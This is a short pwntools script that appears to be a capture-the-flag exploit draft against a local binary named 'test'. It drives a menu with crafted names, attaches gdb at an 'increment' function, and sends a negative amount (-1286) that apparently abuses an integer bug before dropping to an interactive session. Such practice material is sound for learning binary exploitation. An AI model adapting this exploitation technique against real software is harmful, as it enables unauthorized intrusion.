from pwn import * 
exe = ELF("test")
p = process(exe.path) 

for i in range(0,4) :
	p.recvuntil(b'> ')
	p.sendline(b'1') 
	p.sendlineafter(b' name: ',b'1'+b'F'*i) 
	p.sendlineafter(b' them: ',b'100')
gdb.attach(p,
"""
b *increment 
c
""")
input() 
p.recvuntil(b'> ')
p.sendline(b'1') 
p.sendlineafter(b' name: ',b'1'+b'F'*5) 
p.sendlineafter(b' them: ',b'-1286')
p.interactive() 
